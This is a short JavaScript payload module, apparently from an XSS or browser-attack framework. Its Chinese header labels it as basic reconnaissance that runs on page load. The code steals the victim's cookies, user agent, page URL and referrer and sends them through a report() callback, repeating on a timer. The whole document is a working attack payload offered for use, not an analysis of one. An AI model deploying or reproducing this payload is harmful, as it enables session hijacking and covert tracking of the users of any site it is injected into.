// MODULE = {"desc": "基础探测:UA/URL/cookie 回传(加载即执行,可定时循环)", "category": "信息收集", "params": [["interval", "回传间隔ms,默认 5000,0=仅一次"], ["tag", "可选标记"]]}
(function () {
  function collect() {
    var c = "";
    try { c = document.cookie || ""; } catch (e) {}
    report({
      type: "hello",
      tag: _q("tag", "{{tag}}"),
      ua: navigator.userAgent,
      url: location.href,
      referrer: document.referrer || "",
      cookie: c
    });
  }
  collect();
  var iv = parseInt(_q("interval", "{{interval}}"), 10) || 5000;
  if (iv > 0) { setInterval(collect, iv); }
})();
